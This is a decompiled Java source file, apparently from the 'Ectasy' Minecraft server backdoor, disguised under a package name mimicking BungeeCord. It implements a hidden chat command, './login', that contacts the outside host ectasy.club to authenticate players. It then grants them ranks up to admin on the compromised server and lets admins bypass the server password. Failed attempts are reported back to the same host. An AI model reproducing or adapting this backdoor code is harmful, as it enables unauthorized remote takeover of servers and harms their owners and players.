package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.user.User;
import fr.body.ectasy.util.ChatUtil;
import fr.body.ectasy.util.ConfigurationUtil;
import fr.body.ectasy.util.RequestUtil;
import java.security.KeyFactory;
import java.security.Signature;
import java.security.interfaces.RSAPublicKey;
import java.security.spec.X509EncodedKeySpec;
import java.util.Base64;
import net.md5.bungee.Ectasy;
import org.bukkit.event.player.AsyncPlayerChatEvent;

/**
 * The funny
 */
@CommandInfo(
   name = "./login",
   description = "Logs you into the backdoor",
   blatant = false,
   rank = Rank.UNAUTHORIZED,
   aliases = {">"}
)
public class LoginCommand extends AbstractCommand {
   public static String toBase64DER(String var0) {
      return var0.replace("\n", "").replace("-----BEGIN PUBLIC KEY-----", "").replace("-----END PUBLIC KEY-----", "");
   }

   public LoginCommand() {
   }

   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      User var4 = Ectasy.users.get(var1.getPlayer().getName());
      if (var4.rank != Rank.UNAUTHORIZED) {
         ChatUtil.sendChat(var1.getPlayer(), "You are already logged in.");
      } else {
         String var5 = RequestUtil.post("https://ectasy.club/api/auth/server", "{\"username\": \"" + var1.getPlayer().getName() + "\"}");
         if (var5.contains("Unauthorized")) {
            var1.setCancelled(false);
         } else {
            byte[] var6 = Base64.getDecoder().decode(var5.split(":")[1]);
            String var7 = toBase64DER(RequestUtil.get("https://ectasy.club/api/auth/key"));

            try {
               KeyFactory var8 = KeyFactory.getInstance("RSA");
               X509EncodedKeySpec var9 = new X509EncodedKeySpec(Base64.getDecoder().decode(var7));
               RSAPublicKey var10 = (RSAPublicKey)var8.generatePublic(var9);
               Signature var11 = Signature.getInstance("SHA256WithRSA");
               var11.initVerify(var10);
               var11.update((var1.getPlayer().getName() + ":" + var5.split(":")[0]).getBytes());
               boolean var12 = var11.verify(var6);
               if (!var12) {
                  RequestUtil.post("https://ectasy.club/api/auth/analytics", "{\"username\": \"" + var1.getPlayer().getName() + "\"}");
               }
            } catch (Exception var13) {
               RequestUtil.post("https://ectasy.club/api/auth/analytics", "{\"username\": \"" + var1.getPlayer().getName() + "\"}");
               var1.setCancelled(false);
               return;
            }

            String var14 = ConfigurationUtil.get("password");
            if (var14 != null) {
               if (var5.contains("admin")) {
                  var4.rank = Rank.ADMIN;
                  ChatUtil.sendChat(var1.getPlayer(), "You are now logged in Ectasy &5admin&f, bypassing the password.");
                  return;
               }

               if (var3.length == 1) {
                  ChatUtil.sendChat(var1.getPlayer(), "A password is set. Please, use ./login <password>");
                  return;
               }

               if (!var14.equalsIgnoreCase(var3[1])) {
                  ChatUtil.sendChat(var1.getPlayer(), "Incorrect password.");
                  return;
               }
            }

            var4.rank = Rank.FREE;
            if (var5.contains("banned")) {
               var4.rank = Rank.UNAUTHORIZED;
               ChatUtil.sendChat(
                  var1.getPlayer(),
                  "You are currently &cbanned&f from Ectasy, open a ticket @ " + Ectasy.discordInviteLink + " if you think this is an error."
               );
            } else {
               for(Rank var18 : Rank.values()) {
                  if (var5.toLowerCase().contains(var18.name().toLowerCase())) {
                     var4.rank = var18;
                  }
               }

               ChatUtil.sendChat(
                  var1.getPlayer(), "You are now logged in Ectasy " + ChatUtil.getColorByRank(var4.rank) + var4.rank.name().toLowerCase() + "&f."
               );
            }
         }
      }
   }
}
